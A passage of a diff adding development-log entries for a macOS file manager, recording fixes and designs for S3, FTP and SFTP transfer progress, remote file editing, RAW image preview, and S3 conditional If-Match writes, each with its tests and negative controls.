+  arrow key spends a billed request and someone's bandwidth because the cursor passed over a row.
+  Same fork as Quick View's JavaScript switch and Enter-vs-Unlock, and settled the same way: "is
+  this safe" and "should this happen unasked" are different questions. `updateQuickView(unlocking:)`
+  already carries exactly this distinction for encrypted archives, so it is a branch and not a new
+  mechanism — `prepareRemotePreview` reads the cache and never fetches, `openRemotePreview` is the
+  key somebody pressed and may. Cursor movement draws a placeholder naming the file and its size.
+- **A save re-stats before it writes.** S3 has no locking and a save is a whole-object PUT, so the
+  ordinary hazard is silently overwriting an edit someone else made in the meantime. Record size and
+  mtime at download, re-`stat` before uploading, and on a difference say so and let the user choose.
+  One extra request per save on every S3-compatible endpoint, where a conditional `If-Match` PUT is
+  stronger and needs its own probe first (whether `curl` signs it under SigV4, and whether anything
+  but AWS honours it) — parked, not rejected. Note the check is **weaker on FTP**, whose `LIST`
+  stamp is year-less, zone-less and on the server's clock (NOTES.md ▸ curl): say that plainly rather
+  than implying a guarantee the protocol cannot give.
+
+**Probes first, and these are the ones that can change the code that gets written:**
+
+1. **Cancel mid-GET.** `copyFile` takes `isCancelled`; measure that Stop on the download sheet
+   really kills `curl` and leaves **nothing** in the cache — a half-downloaded object cached as a
+   preview is the quiet direction, since it renders as a truncated file rather than as an error.
+2. **A Glacier object.** PUT with `x-amz-storage-class: GLACIER`, then GET: expect `403
+   InvalidObjectState`. Backup buckets are exactly where a file manager gets pointed, and the
+   preview has to say "this object is archived and must be restored first" rather than the generic
+   refusal. Cheap, and only measurable against a real endpoint.
+3. **Read-after-write on the third-party endpoint.** The conflict check assumes a `stat` sees a
+   write that has already landed. AWS has been read-after-write consistent since 2020; the endpoint
+   from Slice 8 has promised nothing, and it is the one that has already inverted two rules.
+4. **The edge-whitespace key, again.** Slice 8's trailing-space object broke every verb that builds
+   a URL from a name while `stat` kept agreeing with the listing. Download-and-upload is two more
+   such verbs, so the same object goes through this path before it ships.
+5. **Time to first byte for a small object**, to check the 400 ms sheet delay inherited from
+   `CloudDownloadPrompt` is still the right threshold — it was tuned against iCloud
+   materialization, not against a network round trip.
+
+**Core first (additive, app untouched).** `RemoteFileRevision` — size + mtime + an optional ETag,
+built from a `FileEntry`, with `isSuperseded(by:)`; deliberately *not* `EditedFileRevision`, which
+answers the opposite question for a local temp copy and must keep ignoring the inode. Plus the pure
+rule for when an explicit fetch is big enough to confirm first, as a table rather than a constant
+buried at a call site. No `VFSBackend` change: the revision comes from `stat`, which every remote
+backend already answers, so the protocol surface stays where it is.
+
+**Then the app.** A window-scoped `RemoteFileCache` beside `archivePreviewCache`, keyed by `VFSPath`
+(which carries the backend id, so two accounts cannot collide) and **stamped with the revision** —
+the `ArchiveIdentity` lesson's second instance: a cache keyed by a path outlives the object that
+path named, and here it would hand over the previous object's bytes under the new object's name.
+Each download lands in its own directory under the same temp root, keeping the file's real name,
+because the editor shows that name and the edit watcher watches the *directory*. Then
+`PanelViewController+RemotePreview` (the passive/explicit pair, mirroring `+ArchivePreview` line for
+line), the remote branch in `quickViewSourceURL`, a placeholder card for the preview surfaces, the
+F4 branch replacing the refusal, and write-back on the window rather than the pane — an edit
+outlives whatever the panes are showing, which is why `+ArchiveWriteBack` already lives there.
+`ArchiveMemberEditRegistry` generalizes to carry a destination (an archive member or a remote path)
+so there is **one** save-detection mechanism with two endings; the remote ending differs in one way
+worth writing down, that it keeps watching after a successful upload and re-baselines the revision,
+because the editor still holds that same copy and a second save must offer again.
+
+**Two things the compiler will not check**, both named here so they are not rediscovered. The
+transfer is a blocking subprocess wait, so it belongs on `BlockingWork` and not in a
+`Task.detached` — the cooperative-pool finding, which `ArchivePreviewCache` predates and should
+follow later. And F4's refusal sentence and its **menu validator** are two copies of one predicate
+(the size-bar lesson): change one and the key works while the item stays gray, which no headless
+test drives.
+
+**Tests, with the negative controls that make them evidence.** Core: the revision table and the
+confirm rule. App: the cache drops a stale entry and keeps a fresh one (neuter the stamp — the first
+must fail while the second passes, or the "fix" is really "re-download every time"); the registry
+routes both destinations; F4 validates enabled for a remote file. The claim that matters most is
+testable directly — a fake transport that **counts requests** while the cursor walks five rows must
+stay at zero, and neutering the passive/explicit split must break exactly that count. Live, in
+`S3AccountLiveIntegrationTests` (`.serialized`, gated on its config file): download → edit → save
+back → verify the bytes with an independent GET, plus the conflict path, driven by mutating the
+object between the download and the save.
+
+**Deliberately out of scope.** Range requests for a partial preview (a truncated image or PDF
+renders as damage, and a head-of-file text preview is a second rendering path for one case);
+local version history of the kind Cyberduck keeps in its editor preferences; and any form of mount.
+The ⏎ gesture is *in* scope and uses the same funnel with the same watch, because leaving it
+silently dead beside a working F4 is stranger than either.
+
+#### Slice 12 — 2026-08-14: a transfer that says where it has got to
+
+Reported as **"can't copy a file to S3"**, with a screenshot of the queue bar reading
+`Zero KB of Zero KB · Copying DSC_0002.NEF` — and then, a minute later, "after 20-30 seconds, it was
+immediately copied". The copy was never broken. Two independent defects compounded into a bar that
+looked dead, and neither is visible from inside the code that owns it.
+
+**The transfer reported nothing until it was over.** `S3Transport`'s byte-moving verbs had no
+progress hook at all, and `S3Backend.copyFile`'s own doc comment said so out loud — "the whole
+object transfers as one `curl` invocation, so `progress` reports once". Measured against the live
+endpoint with the app's exact upload arguments: **29 MB took 99 seconds**, silent throughout. That
+is the whole user-visible bug, and the sentence describing it had been sitting in the source since
+the verb was written, which is this file's most repeated shape — a limitation stated in prose is a
+feature request with a date on it.
+
+**And the readout latched, which is why the *total* read zero too.** `QueueBarView` coalesces the
+byte line to once a second, and it did it by **dropping** updates rather than deferring them. A job
+publishes when it is enqueued — nothing scanned yet, so `Zero KB of Zero KB` is honest — and again
+microseconds later carrying the real 27.7 MB; the second update lands inside the first one's second
+and was thrown away. With nothing else ever publishing, no later update could correct it. A local
+copy hides this completely by publishing every 8 MiB. The tell in the screenshot is that the status
+line *beside* it named the file correctly, from the same snapshot — so the two disagreed about
+whether anything had been measured.
+
+**The two directions have different observables, which is why the fix is an enum and not a flag.**
+A download writes a file on this machine, so its size is the byte count — exact, free, and needing
+no change to the download's carefully measured flags. An upload changes nothing locally; `curl`'s
+percentage meter is the only thing that knows, and `-s` silences it, so the upload verbs now pass
+`-S`. `CurlProgressMeter` (core, +8 tests) parses it, pinned against **bytes captured from that
+99-second run**: rows are `\r`-separated because the meter overwrites itself, the leading integer is
+the overall percentage in both directions, and everything else on that stream — two header lines,
+`curl`'s prose, the labelled `s3-…` write-out fields — fails to start with an integer, which is the
+whole filter. What arrives mid-transfer is therefore an estimate at 1 % resolution, so every path
+ends by reporting the **remainder** against the exact figure from the write-out: the bar is smooth
+and the number it settles on is still the one `curl` measured.
+
+**The bug the fix reintroduced, caught only by running it.** With everything green — 2401 core, all
+the fixtures, both linters — the first live run reported **zero** sightings for a 12-second upload
+while the download streamed perfectly. `FileHandle.read(upToCount:)` is not a chunked read: probed
+on a child writing three lines a second apart, it returned **once, at exit, holding all three**, so
+the whole meter arrived after the transfer it was describing. `availableData` delivers each write as
+it lands (+0.01 s, +1.01 s, +2.02 s). It fails in the quiet direction — every byte still arrives, so
+the response classifies correctly and only the progress silently never moves — which is the same
+failure the slice exists to remove, one layer down.
+
++14 core tests, +3 app tests, +2 live (2401 core / 496 app green, both linters clean). Three
+negative controls: neutering the streaming failed exactly the three progress assertions while the
+"reported nothing, so report it all at the end" one stayed green; putting the dropping coalescer
+back reproduced **`Zero KB of Zero KB`** verbatim in the label, which is the user's screenshot as an
+assertion; and an uncapped fake part upload was rejected by the multipart test, because a part's
+meter is a percentage *of that part* and a double that can exceed its slice would pass on arithmetic
+the wire cannot produce. **Verified live** through the real transport against the real endpoint:
+first report at 1.1 s of a 12.4-second upload and 1.2 s of a 20.4-second download.
+
+**Left undone, and named rather than quietly skipped:** FTP and SFTP have the identical silence —
+the same `ProcessWaiting` hook and the same meter are already in place for them to use, since
+`FTPCurlTransport` drives the same `curl`. **Closed 2026-08-16** (below).
+
+#### Slice 13 — 2026-08-14: the Download button the mouse could not reach
+
+Reported as "the Download button on the Quick View is not active", with the placeholder card drawn
+perfectly over a 29 MB S3 object. The button was armed, visible, un-hidden and correctly wired; what
+it was not was **on top**.
+
+Every backend the preview surface owns is pinned into one container, so the last one added is in
+front — and `showPlaceholder` built the card first and called `showQuickLook(nil)` second, which
+leaves an item-less `QLPreviewView` **visible** and therefore added after the card. It renders out of
+process, so it draws nothing and the card looks right; it also answers `hitTest` and then *declines*
+the event, which is the finding docs/NOTES.md already carries from M11 — so the surface's blanket
+swallow took every press. The fix is one line: raise the card explicitly after the stand-down
+(`addSubview(_:positioned: .above, relativeTo: nil)`, probed to be a pure reorder that keeps the
+pinning constraints and the frame), rather than depending on the order two `ensure*` calls happen to
+run in.
+
+**Why it shipped, and why no verification pass would have caught it.** The ordering is decided by
+whatever the surface shows *first*, and the failing order is the ordinary way into the mode: ⌃Q with
+the cursor already on a remote file. Preview any local file first and the Quick Look view is built
+early, the card lands on top, and the button works — so the bug is invisible to anyone who looked at
+one file before the remote one, which is what a person checking a preview naturally does.
+
++3 app tests (2401 core / 499 app green, both linters clean), and the reproduction was the negative
+control: against the shipped code the hit-test assertions fail with the surface itself as the hit,
+the user's symptom exactly. The third test is the narrowness control — a press on the card's **body**
+must still be swallowed, or "raise the card" quietly becomes "let the whole card through" and a click
+beside the button moves the covered pane's cursor. Nothing else in the suite can see this class: every
+other backend is the only visible thing in the container when it is asked about, so those tests pass
+whatever the ordering is.
+
+#### Slice 14 — 2026-08-15: camera RAW in the preview
+
+Reported as "NEF images are small in the quick view", with a 29 MB frame drawn as a postage stamp in
+the middle of the surface. It is not a scaling bug: the preview was showing a **different image**.
+`showImage` reads the file into `Data` and calls `NSImage(data:)`, which hands ImageIO bare bytes with
+no file name — and a NEF is a TIFF container, so it identifies as `public.tiff` and returns the
+embedded **160×120** thumbnail as the primary image. At that thumbnail's 300 dpi it is 38 pt across,
+and `scaleProportionallyDown` never upscales. Renaming the same file to `.dat` collapses *every*
+route to 160×120, which is the control proving the file name is the whole mechanism.
+
+Camera RAW now decodes through **`CIRAWFilter`** (`RAWImageDecoder`), routed by a `.rawImage`
+conformance test beside the existing `isImage`; everything else keeps `NSImage(data:)` untouched. Two
+measurements decided it against the ImageIO alternatives, and both inverted a recommendation made
+before them:
+
+- **`CGImageSourceCreateImageAtIndex` ignores EXIF orientation** and lays a portrait frame on its
+  side. `NSImage(data:)` *does* honour it today, so the obvious "just give ImageIO the file name" fix
+  would have shipped every portrait photograph sideways — ordinary JPEGs included.
+- **`CGImageSourceCreateThumbnailAtIndex`, the one ImageIO spelling that does transform, diverges
+  from a true demosaic** on one of five files (8.69 levels mean, with *higher* apparent detail — the
+  shape of a camera's own sharpened preview). So the uniform ImageIO route would have quietly
+  substituted the camera's JPEG for the RAW decode on some files.
+
+On quality the two pipelines do not differ: measured at 1:1 over ARW/CR2/NEF/RW2/DNG, centre and
+edge, they agree to **0.02–0.10** levels of 255 with identical variance-of-Laplacian — the same
+demosaic — while Core Image is **3–4×** faster (99–170 ms against 370–509 ms), being GPU-backed. An
+apparent 2–7 level difference seen first was the harness downscaling a 16-bit P3 image against an
+8-bit `DeviceRGB` one, not the decodes.
+
+**The bug the fix introduced, and what caught it.** `CIContext.createCGImage` returns a **lazy**
+image in **0 ms** and defers the whole demosaic to whoever first draws it — the main thread, for
+223–241 ms, on a preview that appears when the cursor moves. So the first version moved nothing off
+the main actor; it relocated the stall. `render(_:toBitmap:)` does the work in the detached task, and
+the finished bitmap also draws cheaper afterwards (7–9 ms against 18 ms). The tell was the *test
+suite's own duration*: five RAW files in 0.26 s, faster than a single decode.
+
++5 app tests (2401 core / 500 app green, both linters clean). Three weaker assertions were tried
+against the lazy version first and all three **passed** it: the dimensions (the extent is right
+either way), `dataProvider.data` (it merely forces the render it was meant to detect), and a 20 ms
+floor on `decode` itself, which failed by **16 µs** — a coin toss, since setting a RAW filter up
+costs about that much. What separates them is the *residual* work after `decode` returns: **0.0 ms**
+against 68–132 ms, a property rather than a stopwatch reading. Verified live on all five formats,
+with the portrait CR2 upright and an ordinary JPEG unchanged as the narrowness control.
+
+#### Slice 15 — 2026-08-15: the page turn that dealt the previous card
+
+Reported the day Slice 14 landed: swiping or arrowing through RAW files "slides the current image and
+only then changes it to the next one", while JPEG and PNG were fine. Not a new bug so much as a newly
+*visible* one — `flip` calls `advance()` and starts its slide immediately, which assumes the next file
+is on screen synchronously, and that held only while every image arrived within a frame or two.
+Slice 14 turned the RAW path from an instant 160×120 thumbnail into a real demosaic, so the
+assumption came due.
+
+Instrumented in the running app, which settled both halves of it in one run:
+
+```
+   0.0 ms  flip begin
+   1.0 ms  showImage begin DSC_0477-Pano.dng      ← the load starts inside advance()
+   1.0 ms  flip advance returned
+   1.0 ms  flip animate start                     ← the 160 ms slide starts here
+ 232.0 ms  showImage installed                    ← the picture arrives long after it ended
+```
+
+The first three lines are the good news: `show` really is entered synchronously inside `advance()`, so
+a "still loading" flag set by the backend **is** visible to `flip` — docs/NOTES.md's warning about the
+selection notification landing a runloop later does not apply on this path, which is what makes the
+fix four lines rather than a redesign. `flip` now hands its slide to `whenContentReady`, which runs it
+at once when nothing is loading and otherwise holds it until `contentDidLoad`. Re-measured after:
+`flip SLIDE starts` lands in the *same millisecond* as the install, three flips out of three.
+
+The state is a `FlipGate` living in `QuickViewPreviewView+Swipe` — the class was at both SwiftLint
+ceilings, so this is the split-by-concept the house rule calls for rather than four more properties
+on a type that had no room. A 0.5 s bound keeps a file that never decodes from leaving the surface
+still; past it the old behaviour returns, which is wrong-looking rather than stuck, and it clears
+every RAW measured here (slowest: a 149 MB pano at 359 ms).
+
++4 app tests (2401 core / 497 app green, both linters clean), asserting on the `CABasicAnimation` the
+slide installs, so "has the page turned" needs no window, screenshot or wait. The negative control is
+the shipped behaviour: with the wait removed, the two tests about waiting fail and the two narrowness
+controls — slides at once when nothing is loading, and a flip cancelled with the surface is not
+revived by a late load — keep passing, which is what says they are measuring different things.
+
+#### Slice 16 — 2026-08-16: FTP and SFTP say where they have got to
+
+Slice 12 fixed S3's motionless queue bar and wrote its own leftover down: the other two remote
+backends had the identical silence, with the meter and the `ProcessWaiting` hook already sitting
+there for them to use. Reproduced before touching anything, against a **throttled** local server
+(1 MB/s — a rate is what this class of bug needs, not an input): an 8 MB FTP upload reported its
+bytes **once, 8.02 seconds after it started**.
+
+**The probes decided the shape, and one of them decided a limitation.**
+
+- **`sftp` prints no progress meter to a spawned process, in any configuration.** Probed six ways
+  over a 1 GiB transfer against a real local `sshd`: `-b -` and interactive, stdout on a pipe and on
+  a PTY, and with the `progress` batch command explicitly turning it on — which answers
+  `Progress meter enabled` and then prints nothing. OpenSSH draws it only for a foreground process
+  group on a controlling terminal, which a spawned child is not. So an SFTP **upload** has no
+  observable at all, and the honest answer is the one it already gave: report the exact count once,
+  at the end. The remaining route — polling the remote size — is a fresh connection and handshake
+  per tick on a transport with no session.
+- **`curl` behaves over FTP exactly as it does over S3**, which is what makes three quarters of this
+  free: `-S` in place of `-sS` puts the meter on stderr at ~1 Hz, the leading integer is the
+  percentage, and the `%{size_upload}` write-out still lands on stdout untouched. A **download**
+  needs no flag change at all — its destination is a local file that grows, so the transport reports
+  exact bytes by watching it, where the meter could only offer a rounded percentage.
+
+So: FTP gets both directions, SFTP gets its download, and the one silent verb is silent because
+`sftp` is. The asymmetry is pinned by a test of its own, or the next reader files it as missing
+wiring and "fixes" it by inventing a number.
+
+`TransferProgressTally` (core, +7 tests) is the arithmetic all three backends now reconcile through
+— forward-only deltas, a resume's existing bytes excluded, a truncated destination read as a fresh
+transfer — and `TransferProgressWatch` (app) is the part that cannot be pure, shared by the three
+transports; `S3CurlRunner`'s two private copies of both are gone. +14 core tests in all (2494 core /
+535 app green, both linters clean).
+
+**The one thing that was not simply S3's fix applied twice**: with the meter let through, it shares
+stderr with `curl`'s own error text, and FTP — unlike S3 — *classifies from that text*.
+`CurlProgressMeter` therefore gained a `prose` side, keeping the table out of what the classifier
+reads, with the header identified **structurally** (whatever precedes the first meter row) rather
+than by matching `% Total`, so the invocations that carry no meter keep every word they printed.
+The live control for it came out **inert** — every failure provoked against the real server
+classified identically either way — and the reason is worth recording: a transfer that fails has
+usually not moved enough for its meter to print anything but zeros. The case that does bite is
+arithmetic rather than luck, and is pinned headlessly: `classify` takes the *last* three-digit
+4xx/5xx token, so a transfer moving at **553k** when the server refuses it reads as FTP's "file name
+not allowed" and turns a missing path into a permission failure.
+
+**Verified live** through the real backends and the app's own transports, compiled in Swift 6 mode:
+FTP download **4 reports over 8.02 s**, FTP upload **5 over 6.04 s**, SFTP download **31 over
+3.12 s** for 1 GiB, each summing *exactly* to what the tool reported moving; SFTP upload one report,
+as documented; and a resumed FTP download reporting **only its 4 MiB remainder** onto a file that
+came out byte-identical. Three live negative controls, each firing on exactly its own half: reverting
+the upload's `-S` and unchunking the stderr drain both took the FTP upload from 5 reports to **1**
+while leaving the download and SFTP untouched — the user's symptom, twice, from two different causes
+one layer apart.
+
+`FTPCurlTransport` hit SwiftLint's `type_body_length` on the way and was split by concept rather than
+shaved: `FTPCurlTransport+Process.swift` now holds the spawn, the drains, the wait and the TLS retry.
+
+#### Slice 17 — 2026-08-16: the write the server decides
+
+The one item this milestone **parked rather than rejected**, taken up: Slice 10 wrote down that a
+conditional `If-Match` PUT "is stronger and needs its own probe first (whether `curl` signs it under
+SigV4, and whether anything but AWS honours it)". The second half of the answer had also gone stale
+in the source — `S3Backend.createFile`'s doc comment said the race between its `stat` and its write
+was "unavoidable and accepted" because "S3 has no create-if-absent — no `O_EXCL`, no conditional PUT
+in the base API", which stopped being true when the service shipped conditional writes. A limitation
+stated in prose is a feature request with a date on it, and this one had two.
+
+**The probes settled the client half completely and named the half nobody can settle.** Against a
+fresh ~200-line endpoint that recomputes SigV4 by hand — a wrong-secret control refused in the same
+run, which is what makes a pass evidence rather than a permissive server agreeing (the `moto`
+lesson, now applied four times in this milestone):
+
+- **`curl` signs both headers and needs nothing new to do it.** They arrive in `SignedHeaders` as
+  `host;if-match;x-amz-content-sha256;x-amz-date` and the signature verified every time. The same
+  finding as `x-amz-copy-source` and `Content-MD5` from Slice 4: the header is ours to spell, the
+  signing is not ours to write.
+- **The ETag's quotes are part of the value**, and this is the finding that would have shipped as a
+  bug. An unquoted digest is a different byte string and does not match, so tidying the quotes away
+  turns *every* conditional write into a 412 — which reads as "somebody else changed this file". The
+  app would then report a conflict that never happened, confidently, on every save. `S3ListingParser`
+  has kept the quotes since Slice 10's ETag pass; what was missing was a test saying nothing between
+  it and the wire may take them off.
+- **A doomed conditional PUT costs a round trip rather than the file.** `curl` sends
+  `Expect: 100-continue` above ~1 KiB, and a server answering the precondition there ends it before
+  the body moves: a **64 MiB** upload against a stale tag reported `size_upload=0` in **0.0009 s**.
+  So conditioning a *large* save-back is free, which is the case that would otherwise have been the
+  argument against conditioning at all — and it is a second reason for a header this backend already
+  keeps for the 403 case.
+- **Whether a given server honours any of it is unmeasurable from here, and that decided the
+  design.** A store that ignores `If-Match` answers 200 and overwrites, indistinguishably from having
+  honoured it. So the protection is built **strictly additive**: `createFile` keeps its local `stat`,
+  a save-back keeps resting on `RemoteFileRevision`'s re-`stat`, and the header closes the window
+  after those on the servers that can — never claiming more. `S3ConditionalWrite` is a named box
+  around one `Bool` for the same reason: `conditionWasSent` is a claim about this client and never
+  about the server, and the multipart path reports **`false`** rather than letting a caller believe
+  a large upload was guarded.
+
+`S3WriteCondition` (with `S3WriteConditionRefusal` and `S3WriteConditionUnsupported`),
+`S3Backend+Conditional`, the two conditional verbs on `S3Transport` and `S3CurlTransport`, and two
+`VFSUnsupportedReason` cases translated in all fourteen. +17 core tests (2511 core / 535 app green,
+both linters clean, all three check scripts passing).
+
+- **A 412 means opposite things depending on what was asked, so it cannot be a status map.** Against
+  `.ifAbsent` it is "there is already a file here"; against `.ifMatches` it is "somebody else has
+  written this since you downloaded it" — one is `alreadyExists`, the other is a sentence about a
+  conflict, and nothing in the response separates them. Hence a second write funnel that has the
+  condition in hand at the moment the status is read, rather than a wider `switch` inside the one
+  that maps a status with no idea what produced it. A 404 joins it for one condition only: an
+  unconditional PUT to a missing key *creates* it, so on an `If-Match` that status can only mean the
+  object was deleted, which is a different sentence again (there is nothing to compare with).
+- **Both refusals are named reasons, not a raw errno.** The generic mapping is `.io(code: EIO)` —
+  "The system reported an error (code 5)" — which is the shape this milestone already had to name
+  once, for `EXDEV` on a folder rename. The control run makes that concrete: with `createFile`'s
+  condition neutered, the refusal test fails showing exactly that `code: 5`.
+- **The transport seam refuses rather than dropping.** A protocol requirement cannot carry a default
+  parameter, so the conditional verbs are separate requirements with a default implementation that
+  **throws** when handed a real condition and forwards an unconditional one. Silently writing without
+  the precondition is the one outcome worse than not having the feature, and it is what a transport
+  added later would otherwise do by inheritance. `S3CurlTransport` implements both, with the
+  *conditional* form as the real one and the plain one forwarding to it — one argument builder, so
+  a precondition cannot be lost by a caller reaching the older spelling.
+- **The folder marker deliberately stays unconditional**, and it is a decision rather than an
+  omission: a marker is idempotent by construction, so `.ifAbsent` there would turn the second F7 in
+  the same place into an error about nothing. Pinned by a narrowness test.
+- **Five negative controls, each firing on exactly its own assertions**: `createFile` dropping the
+  condition (2 failures, one of them the raw errno above), the refusal reader losing its narrowness
+  (a 403 then reads as a conflict), the entity tag's quotes stripped, the seam forwarding instead of
+  throwing (`unconditionalCalls → 3` — the dropped precondition reaching the unguarded verb three
+  times), and multipart claiming it carried a condition it cannot.
+- `S3ProcessArguments.swift` was **one line** under SwiftLint's 500-line ceiling, so this feature was
+  the moment to split it by concept rather than shave it: `S3ProcessArguments+Multipart.swift` now
+  holds the four multipart builders, the seam `S3Backend+Multipart.swift` already uses.
+
+**What is left, named rather than quietly skipped.** The multipart path carries no condition —
+`If-Match` on `CompleteMultipartUpload` is what AWS documents and `curl` would sign it as readily,
+but a completion can already fail *inside a 200*, so a refusal there has two shapes to read rather
+than one, and none of it is measurable against an endpoint that is ours. The **save-back** is the
+other half — `RemoteFileRevision` already carries the ETag that `.ifMatches` wants — and is Slice 18
+below. Neither is verified against a real endpoint yet — the live config file this milestone's suites
+are gated on is not on this Mac, so `S3AccountLiveIntegrationTests` skipped throughout.
+
+#### Slice 18 — 2026-08-16: the save-back sends the precondition
+
+Slice 17's other half, and it is app-only: `BrowserWindowController.writeCondition(checked:)`,
+`conditionalWriter(for:)` on `CompositeBackend`, the refusal's own prompt, and three keys translated
+in all fourteen (+9 app tests; 2511 core / 544 app green, both linters clean, all three check
+scripts passing). F4 on a bucket object now uploads under `If-Match`, and the two sentences Slice 17
+minted reach the screen.
+
+- **The whole wiring has one decision in it, and the natural way round breaks the feature outright:
+  which revision's tag travels.** The obvious reading is "the file we downloaded" — and conditioning
+  on that refuses precisely the write the prompt exists to authorize. Someone told «the file on the
+  server has changed — someone else has edited it» who then presses Upload has said they mean to
+  replace *that* version; an `If-Match` naming the older tag answers 412 to their own decision, in a
+  sentence claiming somebody changed the file. So the **check's** tag is what is sent: it pins what
+  they agreed to overwrite, which is exactly the window `RemoteFileRevision` cannot cover — between
+  the answer and the `PUT`. It compiles, it reads correctly at the call site, and nothing else in
+  either suite can see it, which is what the named function and its negative control are for.
+- **A refusal is a decision, not an error with an OK button.** A 412 here means the object moved in
+  that window — nothing is broken — so it gets its own prompt naming what happened and offering
+  Upload Anyway. The retry is deliberately **unconditional** rather than re-`stat`-and-re-condition:
+  the second form can be refused again by a third writer, which is a loop with a round trip in it
+  (the shape the FTPS trust retry had to guard against), and the user has now been told twice.
+  Without the offer the only route out is saving again in the editor — and an editor asked to save a
+  file it has not changed may write nothing for the watcher to notice, so "just save again" is an
+  escape that is not guaranteed to exist.
+- **The two refusals get two sentences**, because what uploading anyway *does* differs: a changed
+  object has a newer version to destroy, a deleted one has nothing to destroy and nothing to compare
+  with — "replaces their version" and "puts it back as a new file" are each false in the other's
+  case.
+- **`conditionalWriter(for:)` is a lookup rather than a test on the path**, and its narrowness is
+  the half worth asserting: `path.backend.isS3` is `true` for a bucket nobody has connected, while
+  an account root, an archive member, an SFTP path and the local disk must all answer `nil`. A
+  lookup that answered for everything would send an `If-Match` down a seam that (correctly) throws
+  rather than dropping it — so the failure would be a save-back that stops working over SFTP, FTP
+  and the local disk alike.
+- **`conditionWasSent` is deliberately shown nowhere.** A file over the multipart threshold reports
+  `false`, and the prompt the user agreed to never claimed the write was guarded — it rests on the
+  re-`stat`, which works at every size and on every server. Saying "this large save was not
+  protected" would announce the absence of a protection nothing had promised, which is the
+  strictly-additive rule read from the other end.
+- **Three negative controls, each firing on its own assertions**: the condition flattened to
+  `.unconditional` (both tag tests fail, both "writes unconditionally" tests keep passing), the
+  refusal reader widened to answer for every error (the narrowness test fails on all four of its
+  errors, plus the `.gone` half of its neighbour), and the writer lookup made to ignore the path
+  (the narrowness test fails on all four backends while "needs a connection" passes).
+
+Unverified against a real endpoint, and named rather than skipped: the live config file this
+milestone's suites are gated on is still not on this Mac. What that leaves unmeasured is one step —
+whether a real provider's 412 arrives in the shape `S3WriteCondition.refusal(for:)` reads — since
+everything before it (the header travelling, signed, with its quotes intact) was measured in Slice
+17 against an endpoint that recomputes SigV4 by hand.
+
+#### Slice 19 — 2026-08-16: the large upload carries the precondition too
+
+The last thing this milestone had **parked rather than rejected**, taken up. Slice 17 shipped
+`If-Match` on the single `PUT` and wrote down why the multipart half was not in it: "a completion
+can already fail *inside a 200*, so a refusal there has two shapes to read rather than one, and none
+of it is measurable against an endpoint that is ours." The first clause is exactly right and is what
+this slice turns on; the second was not — the *client* half is measurable, and it is the same half
+Slice 17 measured for the `PUT`. What no endpoint of ours can settle is whether a real provider
+honours the header, which is equally true of the small-file path that already shipped and is why
+both are built strictly additive.
+
+`S3WriteCondition.preconditionFailedCode`, the conditional completion on `S3ProcessArguments`,
+`S3Transport` and `S3CurlTransport`, `S3Backend.refusalError(_:or:at:)` as the one definition of what
+a refusal means, and the condition threaded through `uploadObject` → `uploadInParts` → `closeUpload`.
++7 core tests (2518 core / 544 app green, both linters clean, all three check scripts passing). No
+new strings: the two sentences are Slice 17's, now reachable at every file size.
+
+**Five things were probed first, against the SigV4-verifying endpoint grown a multipart
+conversation, with a wrong-secret control refused in the same run.** Two of them decided code that
+was about to be written differently:
+
+- **`curl` signs the header on the completion too**, arriving as
+  `content-type;host;if-match;x-amz-content-sha256;x-amz-date`. Worth measuring rather than
+  inheriting from the `PUT`: this canonical request differs in every field — `POST`, a query string,
+  and a **real** payload digest of the manifest where a `-T` stream signs `UNSIGNED-PAYLOAD` — and it
+  verified anyway. `If-None-Match: *` behaves identically.
+- **A refusal can arrive under a status the server has already committed to.** Driven into AWS's
+  documented late-failure shape, the identical refusal came back **`HTTP=200` carrying
+  `<Code>PreconditionFailed</Code>`**. So `refusal(for:)`, which keyed on the *status*, answers `nil`
+  there — i.e. reports a save as having succeeded while the object silently does not exist. The code
+  is now read as an alternative to the status, and `closeUpload` reads a refusal **twice**: once
+  through `conditionallyWrite` (the 412 shape) and once out of the body (the 200 shape), which is
+  the only thing that can see it.
+- **A refusal here cannot save the transfer, and the asymmetry is worth stating** because the
+  opposite is true one verb over. A conditional `PUT` is ended by the answer to `Expect:
+  100-continue` before the body moves (64 MiB refused in 0.0009 s, Slice 17); every part of a
+  multipart upload has already been sent by the time the completion is made. Conditioning a large
+  upload is protection, never an economy — so "Upload Anyway" re-sends the file, which is the price
+  of the alternative not being available: holding the upload open across a modal sheet is a bill the
+  user cannot see in any listing.
+- **A refused completion leaves the upload open**, its parts stored and billed. `uploadInParts` has
+  aborted on every failing exit since Slice 5, so a refusal being a throw is what makes that cover
+  this too — the whole structural cost of the feature.
+- **The quotes are load-bearing here as well**: an unquoted but otherwise *correct* tag was refused
+  with the identical 412 a genuinely stale one gets. Slice 17's finding, on a new verb, and the
+  reason nothing between `S3ListingParser` and the wire may tidy them.
+
+The size fork moved rather than being copied. `S3Backend+Conditional.upload` used to re-test the
+multipart threshold and hand the large case to an *unconditional* `uploadObject`; both branches now
+live in `uploadObject`, which takes the condition and attaches it to whichever request the object's
+existence hangs on. A caller choosing where to attach one would have been a second copy of the
+threshold — which is how the small and large paths would come to disagree about whether a save is
+guarded, on a question whose whole point is that the user is told.
+
+**Four negative controls, each firing on exactly its own assertions**: the completion sending
+`.unconditional` (the header test alone), the body-side reading removed (the 200-shape test alone,
+throwing the raw `code: 5` this milestone has now had to name three times), the code-based reading
+removed (that one plus the pure refusal test), and the seam forwarding instead of throwing
+(`unconditionalCalls → 3`, the same shape Slice 17 recorded).
+
+**Verified live** through the real `S3Backend` driving the app's own `S3CurlTransport`, compiled in
+Swift 6 mode, with the server's log as the witness: a 64 MiB file went out as five parts and a
+guarded completion, the stale-tag run was refused with the named sentence, and the object was
+untouched afterwards. All 26 requests signature-verified; the header appears on the **completion
+only** — never on a part, never on the create — and the refused completion is followed by an
+`ABORT` that took the open-upload count back to zero. Both refusal shapes were run end to end, and
+the live negative control is the sharpest one available: the *same* reverted binary passes against a
+412-refusing server and fails against a 200-committed one, which is what says the second reading is
+reachable only in the shape it was written for.
+
+What was still unverified here — no real provider's refusal having been seen — was closed by the
+**third follow-up pass below**, which also retires the framing this paragraph used to carry: it read
+as needing "the race", and a 412 rests on a stale *tag* rather than on a timing, so it was reachable
+in a straight line all along. Everything before it — the header travelling, signed, with its quotes
+intact, on both verbs — was already measured.
+
+**With this, M21's own list is empty.** The two remaining items are not code: Slice 18's and this
+slice's one unmeasured step needs an account, and the milestone's opening half — whether the other
+providers' sync badges light up, and whether each client's `.Trash` has the shape `Places` assumes —
+needs those clients installed. **OneDrive was the half of that done on 2026-08-17 and Dropbox on
